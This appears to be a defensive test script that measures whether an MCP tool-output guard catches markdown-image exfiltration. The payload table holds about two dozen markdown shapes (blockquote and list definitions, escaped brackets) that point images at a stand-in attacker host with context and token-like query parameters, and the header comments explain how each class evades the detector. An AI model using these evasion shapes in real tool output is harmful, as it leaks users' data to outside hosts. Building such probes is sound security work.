// T84 — the two bypass classes T84-escape.ts surfaced, characterised.
//
// A) the definition-site LINE ANCHOR: `^[ \t]*\[` cannot reach a definition
//    inside a block container (blockquote `>`, list item `-`/`*`/`1.`), which
//    CommonMark and `marked` both resolve. Pre-existing: the replaced pattern
//    had the same anchor.
// B) the USE-side escape: an image's DESCRIPTION carrying a backslash-escaped
//    `]` moves the reference bracket past the detector's candidate ends, so the
//    FULL and COLLAPSED reference spellings are not seen. This is exactly the
//    third `descriptionEnds` candidate alternative (A) would have added and
//    T83's narrowing did not.
//
// Each row is measured against the renderer, the shipped detector, all four
// public boundaries, an allowlist-on variant, a secret-shaped URL (defence in
// depth), and the pre-T83 copy under $T84_TMP (so «pre-existing or introduced»
// is measured, not argued).
//
// Read-only, offline, synthetic and reserved hosts only.
// Usage: T84_TMP=<dir> bun T84-bypass.ts
import {
  prepareOutputForPersistence,
  validateOutputForTransport,
  type GuardResult,
} from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";
import { detectExfil } from "../../../../src/security/detect/exfil";
import { marked } from "marked";

const TMP = process.env.T84_TMP as string;
const { detectExfil: pre } = (await import(`${TMP}/exfil-prechange.ts`)) as {
  detectExfil: typeof detectExfil;
};

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const SECRET = `https://${ATT}/p?token=sk-live-0123456789abcdefghij`;

const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

const shapes: Record<string, string> = {
  // ---- class A: the definition-site line anchor -------------------------
  a01Blockquote: `> [a]: ${U}\n>\n> ![a]\n`,
  a02BlockquoteSpaced: `>  [a]: ${U}\n>\n> ![a]\n`,
  a03BlockquoteNested: `> > [a]: ${U}\n> >\n> > ![a]\n`,
  a04BlockquoteDefOnlyUseOutside: `> [a]: ${U}\n\n![a]\n`,
  a05ListDash: `- [a]: ${U}\n\n![a]\n`,
  a06ListStar: `* [a]: ${U}\n\n![a]\n`,
  a07ListOrdered: `1. [a]: ${U}\n\n![a]\n`,
  a08ListDefAndUseInside: `- [a]: ${U}\n- ![a]\n`,
  a09BlockquoteEscapedLabel: `> [x\\]]: ${U}\n>\n> ![x\\]]\n`,
  a10ListEscapedLabel: `- [x\\]]: ${U}\n\n![x\\]]\n`,
  a11BlockquoteFullRef: `> [a]: ${U}\n>\n> ![alt][a]\n`,
  a12BlockquoteCollapsed: `> [a]: ${U}\n>\n> ![a][]\n`,
  // controls for class A: the INLINE image needs no definition table and must
  // stay flagged inside the same containers
  a90BlockquoteInline: `> ![a](${U})\n`,
  a91ListInline: `- ![a](${U})\n`,
  a92PlainDef: `[a]: ${U}\n\n![a]\n`,

  // ---- class B: the use-side escape in an image description --------------
  b01FullRefEscapedAlt: `![a\\]][b]\n\n[b]: ${U}\n`,
  b02FullRefEscapedAltTwice: `![a\\]b\\]][c]\n\n[c]: ${U}\n`,
  b03FullRefLeadingEscape: `![\\]][b]\n\n[b]: ${U}\n`,
  b04CollapsedEscapedAlt: `![a\\]][]\n\n[a\\]]: ${U}\n`,
  b05FullRefEscapedAltEscapedRef: `![a\\]][b\\]]\n\n[b\\]]: ${U}\n`,
  b06NestedInLinkEscapedAlt: `[![a\\]][b]](https://ci.example.org/job)\n\n[b]: ${U}\n`,
  b07InlineEscapedAlt: `![a\\]](${U})\n`,
  b08InlineEscapedAltAngle: `![a\\]](<${U}>)\n`,
  // control: the same shapes without the escape
  b90FullRefPlainAlt: `![a][b]\n\n[b]: ${U}\n`,
  b91InlinePlainAlt: `![a](${U})\n`,
};

const cwd = process.cwd();
const ctx: McpContext = {
  cwd,
  config: mergeMcpConfig({ redactToolOutput: false }),
  discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
  transport: "in-process",
  tools: Object.entries(shapes).map(([name, text]) => ({
    name: `p.${name}`,
    module: "standard" as const,
    description: name,
    inputSchema: { type: "object" },
    mutating: false,
    invoke: async () => ({ note: text }),
  })),
};

function rendererImgSrcs(md: string): string[] {
  const html = marked.parse(md, { async: false }) as string;
  return [...html.matchAll(/<img[^>]*\ssrc="([^"]*)"/g)].map((m) => m[1] as string);
}

const rows: Array<Record<string, unknown>> = [];
for (const [name, text] of Object.entries(shapes)) {
  const serialized = JSON.stringify({ note: text });
  const call = await dispatchCallTool(ctx, `p.${name}`, {});
  const persisted = prepareOutputForPersistence(pass, serialized);
  const transported = validateOutputForTransport({ value: { note: text }, format: "json" });
  const seamText = await redactToolOutput(cwd, serialized);
  const imgs = rendererImgSrcs(text);
  const rendererFetchesAttacker = imgs.some((s) => s.includes(ATT));
  const boundaries = {
    mcp: JSON.stringify(call).includes(ATT),
    persist: persisted.allowed ? persisted.content.includes(ATT) : false,
    transport: transported.text.includes(ATT),
    seam: seamText.includes(ATT),
  };
  // defence in depth: does the secrets floor at least cut the URL when the
  // parameter is secret-shaped?
  const secretText = text.split(U).join(SECRET);
  const secretTransported = validateOutputForTransport({
    value: { note: secretText },
    format: "json",
  });
  rows.push({
    id: name,
    rendererFetches: imgs,
    rendererFetchesAttacker,
    detectorFindings: detectExfil(text, []).length,
    prechangeFindings: pre(text, []).length,
    allowlistOnFindings: detectExfil(text, [ATT]).length,
    mcpState: (call as { redaction?: { state?: string } }).redaction?.state ?? "?",
    boundaries,
    boundaryCount: Object.values(boundaries).filter(Boolean).length,
    secretShapedHostSurvives: secretTransported.ok
      ? secretTransported.text.includes(ATT)
      : false,
    verdict:
      rendererFetchesAttacker && Object.values(boundaries).some(Boolean) ? "BYPASS" : "closed",
  });
}

console.log(
  JSON.stringify(
    {
      probe: "T84-bypass",
      rows,
      bypasses: rows.filter((r) => r.verdict === "BYPASS").map((r) => r.id),
      introducedByT83: rows
        .filter((r) => r.verdict === "BYPASS" && r.prechangeFindings !== r.detectorFindings)
        .map((r) => r.id),
    },
    null,
    2,
  ),
);
